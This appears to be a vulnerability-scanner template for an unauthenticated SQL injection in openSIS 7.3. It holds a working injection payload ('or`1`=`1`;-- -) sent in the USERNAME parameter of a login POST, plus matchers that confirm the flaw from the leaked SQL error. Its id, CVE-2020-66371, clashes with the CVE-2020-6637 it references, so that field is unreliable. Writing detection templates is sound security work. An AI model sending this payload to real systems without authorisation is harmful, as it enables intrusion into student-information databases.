id: CVE-2020-66371
info:
  author: pikpikcu
  description: openSIS Community Edition version 7.3 is vulnerable to SQL injection
    via the USERNAME parameter of index.php.
  name: OpenSIS v7.3 unauthenticated SQL injection
  reference:
  - https://nvd.nist.gov/vuln/detail/CVE-2020-6637
  - https://cinzinga.com/CVE-2020-6637/
  severity: high
  tags: cve,cve2020,sqli,opensis
requests:
- matchers:
  - condition: and
    part: body
    type: word
    words:
    - 'SQL STATEMENT:'
    - <TD>UPDATE login_authentication SET FAILED_LOGIN=FAILED_LOGIN+1 WHERE UPPER(USERNAME)=UPPER(NULL)or`1`=`1`;--
      -')</TD>
  - condition: and
    part: header
    type: word
    words:
    - text/html
  - status:
    - 200
    type: status
  matchers-condition: and
  raw:
  - 'POST /account/index.php HTTP/1.1

    Host: {{Hostname}}

    Content-Type: application/x-www-form-urlencoded


    USERNAME=%27%29or%601%60%3D%601%60%3B--+-&PASSWORD=A&language=en&log=

    '
